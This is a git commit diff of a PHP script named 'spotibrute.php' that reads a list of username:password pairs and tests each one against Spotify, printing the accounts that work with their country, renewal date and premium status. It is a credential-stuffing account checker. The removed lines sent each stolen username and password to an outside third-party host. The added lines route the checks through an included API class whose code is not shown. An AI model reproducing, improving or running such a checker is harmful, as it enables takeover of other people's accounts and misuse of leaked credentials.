acd8e148acb96a77ad90a8ed7ac61d1ef3bc3db3
mr-z3r0 <ml776566@gmail.com>
2019-03-07 19:39:50 -0500

    update

--- spotibrute.php
+++ spotibrute.php
@@ -1,6 +1,6 @@
-
 <?php
 error_reporting(0);
+include "api.php";
 echo "\033[01;32m
   _________             _________                       __
  /   _____/_____   ____ \_   ___ \____________    ____ |  | __
@@ -20,13 +20,9 @@ echo
 "\033[01;37m======================================\033[0m\n";
 $oa = fopen($ruta, 'r');
 while($a = fgetcsv($oa, 1000, ':')){
-        $spotify = curl_init();
-        curl_setopt($spotify,
-CURLOPT_URL,"http://www.evilfrogsccgen.net/spotify/api/?u=$a[0]&p=$a[1]");
-        curl_setopt($spotify, CURLOPT_RETURNTRANSFER, 1 );
-        $info=curl_exec ($spotify);
-        curl_close ($spotify);
-        if (!strpos($info, 'FREE')!==false){
+        $sp = new spotify();
+        $info = $sp->check($a[0], $a[1]);
+        if (!strpos($info, 'FREE') !==false){
         $info=(json_decode($info, true));
         $i=0;
         foreach($info as $clave => $valor) {
@@ -39,23 +35,21 @@ CURLOPT_URL,"http://www.evilfrogsccgen.net/spotify/api/?u=$a[0]&p=$a[1]");
                 };
                 $i++;
                 if($i==1){
-        echo "\033[01;32mCuenta: $a[0]:$a[1]|\033[0m\n";
-
+        echo "\033[01;32mCuenta: $a[0]:$a[1]|\033[0m";
                 }
-
 if($clave=="renueva:"||$clave=="Pais:"){
                         foreach($valor as $clave2=>$valor2) {
         echo "\033[01;32m$clave $valor2|\033[0m";
 }
                         if($i==2){
                 echo "\033[01;32mPREMIUM\033[0m\n";
-
 }
         }
         }
         }
-        }else{
-        }
+        }else {
+
+}
 }
         fclose($oa);
  ?>
